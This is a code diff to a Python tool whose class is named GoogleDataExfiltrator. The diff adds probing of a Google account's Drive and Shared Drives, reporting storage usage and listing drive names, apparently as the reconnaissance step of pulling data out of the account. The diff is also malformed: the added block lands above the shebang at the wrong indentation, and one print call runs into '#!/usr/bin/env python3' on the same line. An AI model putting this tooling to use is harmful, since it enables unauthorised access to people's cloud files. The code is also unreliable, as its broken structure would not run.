@@ -1,4 +1,43 @@
-#!/usr/bin/env python3
+# Probe Google Drive
+        print("[*] Probing Google Drive...", end=" ")
+        try:
+            results = self.services['drive'].files().list(pageSize=1).execute()
+            files = results.get('files', [])
+            if files:
+                # Get storage info
+                about = self.services['drive'].about().get(fields='storageQuota').execute()
+                storage = about.get('storageQuota', {})
+                active_services['drive'] = {
+                    'active': True,
+                    'has_files': True,
+                    'storage_used': storage.get('usage', 'Unknown')
+                }
+                print(f"✓ ACTIVE (Files found)")
+            else:
+                active_services['drive'] = {'active': False, 'reason': 'No files'}
+                print("✗ Empty")
+        except Exception as e:
+            active_services['drive'] = {'active': False, 'reason': str(e)}
+            print(f"✗ Error: {e}")
+        
+        # Probe Shared Drives
+        print("[*] Probing Shared Drives...", end=" ")
+        try:
+            shared_drives_results = self.services['drive'].drives().list(pageSize=10).execute()
+            shared_drives = shared_drives_results.get('drives', [])
+            if shared_drives:
+                active_services['shared_drives'] = {
+                    'active': True,
+                    'count': len(shared_drives),
+                    'drives': [{'id': d['id'], 'name': d['name']} for d in shared_drives]
+                }
+                print(f"✓ ACTIVE ({len(shared_drives)} shared drives found)")
+            else:
+                active_services['shared_drives'] = {'active': False, 'reason': 'No shared drives'}
+                print("✗ None found")
+        except Exception as e:
+            active_services['shared_drives'] = {'active': False, 'reason': str(e)}
+            print(f"✗ Error: {e}")#!/usr/bin/env python3
 
 import os
 # Disable OAUTHLIB's scope checking - Google may add openid automatically
@@ -7,7 +46,6 @@ os.environ['OAUTHLIB_RELAX_TOKEN_SCOPE'] = '1'
 import json
 import pickle
 import base64
-import shutil
 import argparse
 from datetime import datetime
 from pathlib import Path
@@ -384,7 +422,15 @@ class GoogleDataExfiltrator:
         print("\n\033[92mServices with data:\033[0m")
         for service, info in active_services.items():
             if info.get('active'):
-                print(f"\033[92m  ✓ {service.upper()}\033[0m")
+                service_display = f"  ✓ {service.upper()}"
+                # Add extra details for shared drives
+                if service == 'shared_drives' and info.get('drives'):
+                    service_display += f" - {info.get('count')} drive(s):"
+                    print(f"\033[92m{service_display}\033[0m")
+                    for drive in info.get('drives', []):
+                        print(f"\033[92m      • {drive['name']}\033[0m")
+                else:
+                    print(f"\033[92m{service_display}\033[0m")
         
         print("\nInactive/Empty services:")
         for service, info in active_services.items():
@@ -1515,7 +1561,7 @@ Examples:
     
     args = parser.parse_args()
     
-    # Show banner
+      # Show banner
     banner = r"""
 ⠀⠀⠀⠀⠀⢀⣤⣶⣾⣿⣿⣿⣷⣶⣤⡀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀
